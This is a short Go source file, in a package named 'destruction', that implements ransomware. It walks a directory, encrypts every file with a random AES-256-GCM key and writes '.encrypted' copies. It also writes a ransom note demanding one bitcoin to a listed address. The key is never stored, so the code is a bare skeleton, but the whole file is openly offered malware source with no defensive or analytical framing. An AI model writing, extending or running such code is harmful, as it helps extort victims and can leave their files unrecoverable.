package destruction

import (
"crypto/aes"
"crypto/cipher"
"crypto/rand"
"io"
"os"
"path/filepath"
)

type Ransomware struct{}

func NewRansomware() *Ransomware {
return &Ransomware{}
}

func (r *Ransomware) EncryptFiles(dir string) error {
key := make([]byte, 32)
if _, err := io.ReadFull(rand.Reader, key); err != nil {
return err
}
return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
if err != nil {
return err
}
if !info.IsDir() {
return r.encryptFile(path, key)
}
return nil
})
}

func (r *Ransomware) encryptFile(path string, key []byte) error {
data, err := os.ReadFile(path)
if err != nil {
return err
}
block, err := aes.NewCipher(key)
if err != nil {
return err
}
gcm, err := cipher.NewGCM(block)
if err != nil {
return err
}
nonce := make([]byte, gcm.NonceSize())
if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
return err
}
ciphertext := gcm.Seal(nonce, nonce, data, nil)
return os.WriteFile(path+".encrypted", ciphertext, 0644)
}

func (r *Ransomware) CreateRansomNote() error {
note := `All files have been encrypted. Send 1 BTC to address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
return os.WriteFile("RANSOM_NOTE.txt", []byte(note), 0644)
}
